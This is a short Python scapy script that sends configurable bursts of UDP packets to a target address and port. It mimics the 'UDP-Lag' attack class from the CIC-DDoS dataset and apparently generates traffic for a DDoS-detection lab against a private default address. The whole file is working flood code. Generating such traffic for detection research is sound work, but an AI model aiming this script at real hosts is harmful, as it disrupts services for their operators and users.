#!/home/deep/files/arf_ddos/venv/bin/python
import argparse
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning, module="scapy")

from scapy.all import IP, UDP, Raw, send
from random import randint
import time

DEFAULT_TARGET = '10.0.0.1'


def main():
    parser = argparse.ArgumentParser(description='Send bursty CIC-DDoS-style UDP-Lag traffic.')
    parser.add_argument('target', nargs='?', default=DEFAULT_TARGET)
    parser.add_argument('--count', type=int, default=15000)
    parser.add_argument('--burst', type=int, default=250)
    parser.add_argument('--pause', type=float, default=0.02)
    parser.add_argument('--port', type=int, default=33434)
    args = parser.parse_args()

    if args.count < 1 or args.burst < 1 or args.pause < 0:
        parser.error('count and burst must be positive; pause cannot be negative')

    print(
        f'[UDPLAG] sending {args.count} UDP packets to '
        f'{args.target}:{args.port} in bursts of {args.burst}',
        flush=True,
    )
    sent = 0
    while sent < args.count:
        batch_size = min(args.burst, args.count - sent)
        packets = [
            IP(dst=args.target)
            / UDP(dport=args.port, sport=randint(1024, 65535))
            / Raw(load=b'Y' * 140)
            for _ in range(batch_size)
        ]
        send(packets, verbose=0)
        sent += batch_size
        if sent < args.count:
            time.sleep(args.pause)
    print('[UDPLAG] attack burst complete', flush=True)


if __name__ == '__main__':
    main()
